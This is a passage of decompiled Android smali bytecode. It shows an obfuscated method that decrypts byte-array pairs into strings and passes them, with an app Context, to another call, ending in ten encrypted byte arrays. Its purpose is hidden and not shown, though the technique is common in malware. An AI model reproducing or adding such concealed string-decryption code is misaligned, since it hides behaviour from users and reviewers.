    invoke-static {p2, p3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-static {p0, p2, p1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->c(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void

    :array_0
    .array-data 1
        0x2t
        -0x57t
        -0x1bt
        0x31t
        0x7dt
        0x34t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x63t
        -0x27t
        -0x6bt
        0x58t
        0x13t
        0x5et
        -0x12t
        0x71t
    .end array-data

    :array_2
    .array-data 1
        -0x6ct
        -0xet
        -0x54t
        -0x2et
        0xft
        0x0t
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x31t
        -0x46t
        -0x8t
        -0x61t
        0x43t
        0x5dt
        0x43t
        -0x17t
    .end array-data

    :array_4
    .array-data 1
        -0x30t
        -0x63t
        0x4bt
        0x50t
        -0x47t
        0x79t
        -0x47t
    .end array-data

    :array_5
    .array-data 1
        -0x54t
        -0x1ft
        0x10t
        0x0t
        -0xet
        0x3et
        -0x1ct
        -0x6bt
    .end array-data

    :array_6
    .array-data 1
        -0x19t
        -0x61t
        -0x56t
        -0x2dt
        0x5ft
        -0x7dt
        -0x20t
    .end array-data

    :array_7
    .array-data 1
        -0x65t
        -0x1dt
        -0xft
        -0x61t
        0x10t
        -0x3ct
        -0x43t
        -0x19t
    .end array-data

    :array_8
    .array-data 1
        -0x52t
        0x35t
        0x6ct
        -0x12t
        -0x6ft
        0x1t
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x31t
        0x45t
        0x1ct
        -0x79t
        -0x1t
        0x6bt
        -0x42t
        0x39t
    .end array-data
.end method
